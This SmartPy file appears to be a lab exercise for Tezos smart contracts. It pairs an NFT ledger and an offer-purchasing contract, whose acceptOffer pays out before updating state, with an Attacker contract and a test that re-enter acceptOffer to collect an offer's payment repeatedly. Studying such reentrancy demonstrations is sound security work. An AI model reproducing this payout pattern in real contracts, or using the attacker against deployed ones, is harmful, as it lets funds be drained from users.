import smartpy as sp
@sp.module
def main():

    paramType:type = sp.record(tokenID = sp.int, newOwner = sp.address)

    class Ledger(sp.Contract):
        
        def __init__(self, admin):
            self.data.admin = admin
            self.data.tokens = sp.big_map()
            self.data.nextTokenID = 1

        @sp.entrypoint
        def mint(self, metadata):
            self.data.tokens[self.data.nextTokenID] = sp.record(owner = sp.sender, metadata = metadata)
            self.data.nextTokenID += 1

        @sp.onchain_view()
        def getTokenOwner(self, tokenID):
            sp.cast(tokenID, sp.int)
            return self.data.tokens[tokenID].owner

        @sp.entrypoint
        def changeOwner(self, tokenID, newOwner):
            assert sp.sender == self.data.admin
            self.data.tokens[tokenID].owner = newOwner

    class Purchaser(sp.Contract):

        def __init__(self, admin):
            self.data.admin = admin
            self.data.ledger_address = admin
            self.data.offers = sp.big_map()
            self.data.escrow = sp.big_map()
            self.data.nbOffers = 1

        @sp.entrypoint
        def setLedger(self, ledger_address):
            assert sp.sender == self.data.admin
            self.data.ledger_address = ledger_address

        @sp.entrypoint
        def addOffer(self, tokenID):
            self.data.offers[self.data.nbOffers] = sp.record(tokenID = tokenID, buyer = sp.sender, price = sp.amount)
            self.data.nbOffers += 1
            if not self.data.escrow.contains(sp.sender):
                self.data.escrow[sp.sender] = sp.tez(0)
            self.data.escrow[sp.sender] += sp.amount

        @sp.entrypoint
        def acceptOffer(self, offerID):
            sp.cast(offerID, sp.int)
            offer = self.data.offers[offerID]
            owner = sp.view("getTokenOwner", self.data.ledger_address, offer.tokenID, sp.address).unwrap_some()            
            assert sp.sender == owner
            sp.send(owner, offer.price)
            self.data.escrow[offer.buyer] -= offer.price
            ledger_contract = sp.contract(paramType, self.data.ledger_address, entrypoint="changeOwner").unwrap_some()
            sp.transfer(sp.record(tokenID = offer.tokenID, newOwner = offer.buyer), sp.tez(0), ledger_contract)

    class Attacker(sp.Contract):

        def __init__(self, purchaserAddress):
            self.data.purchaserAddress = purchaserAddress
            self.data.nbCalls = 0
            self.data.offerID = 0
            self.data.price = sp.tez(0)

        @sp.entrypoint
        def attack(self, offerID):
            self.data.nbCalls = 2
            self.data.offerID = offerID
            purchaser_contract = sp.contract(sp.int, self.data.purchaserAddress, entrypoint="acceptOffer").unwrap_some()
            sp.transfer(offerID, sp.tez(0) , purchaser_contract)

        @sp.entrypoint
        def default(self):
            self.data.nbCalls -= 1
            if self.data.nbCalls > 0:
                purchaser_contract = sp.contract(sp.int, self.data.purchaserAddress, entrypoint="acceptOffer").unwrap_some()
                sp.transfer(self.data.offerID, sp.tez(0), purchaser_contract)
                
            
# Tests
@sp.add_test(name="testing ledger")
def test():
    scenario = sp.test_scenario(main)
    alice = sp.test_account("alice").address
    bob = sp.test_account("Bob").address
    purchaser = main.Purchaser(alice)
    scenario += purchaser
    ledger = main.Ledger(purchaser.address)
    scenario += ledger
    attacker = main.Attacker(purchaser.address)
    scenario += attacker

    purchaser.setLedger(ledger.address).run(sender = alice)

    ledger.mint("my NFT").run(sender = attacker.address)
    a = ledger.getTokenOwner(1)
    scenario.verify(a == attacker.address)

    purchaser.addOffer(1).run(sender = alice, amount = sp.tez(100))
    purchaser.addOffer(2).run(sender = alice, amount = sp.tez(100))
    #purchaser.acceptOffer(1).run(sender = attacker.address)

    attacker.attack(1)

